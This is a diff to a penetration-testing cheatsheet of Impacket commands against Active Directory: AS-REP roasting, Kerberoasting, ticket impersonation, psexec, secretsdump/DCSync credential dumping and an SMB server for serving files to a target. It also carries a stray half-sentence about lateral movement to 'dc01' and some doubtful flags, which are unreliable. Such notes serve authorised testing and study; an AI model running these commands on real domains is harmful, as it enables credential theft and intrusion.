@@ -51,7 +51,7 @@ Password Encryption tool on Windows
 For users that do not require Kerberos preauthentiation: 
 'Do not require Kerberos preauthentication' set (UF_DONT_REQUIRE_PREAUTH). 
 Output is compatible with JtR:[[John-The-Ripper-Cheatsheet]] use `-format hashcat` for  hashcat:[[Hashcat-Cheatsheet]] 
-
+order to get access to the dc01 machine, we need to perform a lateral movement attack that we l
 ```bash
 GetNPUsers.py  -dc-ip $IP -request '$domain/' 
 GetNPUsers.py  -dc-ip $IP -request '$domain/' -format hashcat
@@ -75,7 +75,7 @@ getTGT.py -hashes lm:nt domain.com/user
 ```
 
 ## GetST.py
-Given a password, hash, aesKey or TGT in ccache, this script will request a Service Ticket and save it as ccache. If the account has constrained delegation (with protocol transition) privileges you will be able to use the -impersonate`.
+Given a password, hash, aesKey or TGT in ccache, this script will request a Service Ticket and save it as ccache. If the account has constrained delegation (with protocol transition) privileges you will be able to use the -impersonate.
 switch to request the ticket on behalf another user.
 ```bash
 getST.py -hashes $lm:$nt -spn $spn/$spn-dc $domain$/$user
@@ -84,6 +84,7 @@ getST.py -hashes $lm:$nt -spn $spn/$spn-dc $domain$/$user
 ## GetUserSPNs.py
 This example will try to find and fetch Service Principal Names that are associated with normal user accounts. Output is compatible with JtR and HashCat.
 ```bash
+GetUserSPNs.py -dc-ip $ip $domain.local/$user -request # provide a password
 GetUserSPNs.py -dc-ip $dc-ip $spn.info/$notanadmin
 ```
 
@@ -96,8 +97,8 @@ mssqlclient.py -port $PORT $domain/$user@$IP -windows-auth
 ## psexec.py
 Similiar to [[Sysinternals-Psexec]] like functionality example using [RemComSvc](https://github.com/kavika13/RemCom). Runs as nt system - wmiexec.py runs as Administrator.
 ```bash
-
 psexec.py $domain/$username:$password@$IP <command>
+psexec.py $domain/$username:$password@$IP -hash
 ```
 
 ## raiseChild.py
@@ -117,6 +118,11 @@ python raiseChild.py -w ccache childDomain.net/$adminuser
 ```
 
 ## secretsdump.py
+
+
+```bash
+secretsdump.py -target-ip $IP $domain/$user@$ip
+```
 
 Exploit DCSync Privileges
 ```bash
@@ -153,12 +159,12 @@ This is useful in the situation where the target machine does NOT have a writeab
 Host a Python implementation of an SMB server. Allows to quickly set up shares and user accounts
 ```bash
 smbserver.py $SHARENAME /path/to/your/local/share -smb2support
-smbserver.py $SHARENAME /path/to/your/local/share --username $user --password 
+smbserver.py $SHARENAME /path/to/your/local/share -username $user -password 
 $password
 ```
 [IppsecRocks](https://ippsec.rocks/?#), start the smbserver your current directory
 ```bash
-impacket-smbserver scriptserver $(pwd) -smb2support -user user -password pass
+impacket-smbserver scriptserver $(pwd) -smb2support -username user -password pass
 ```
 On remote:
 ```powershell
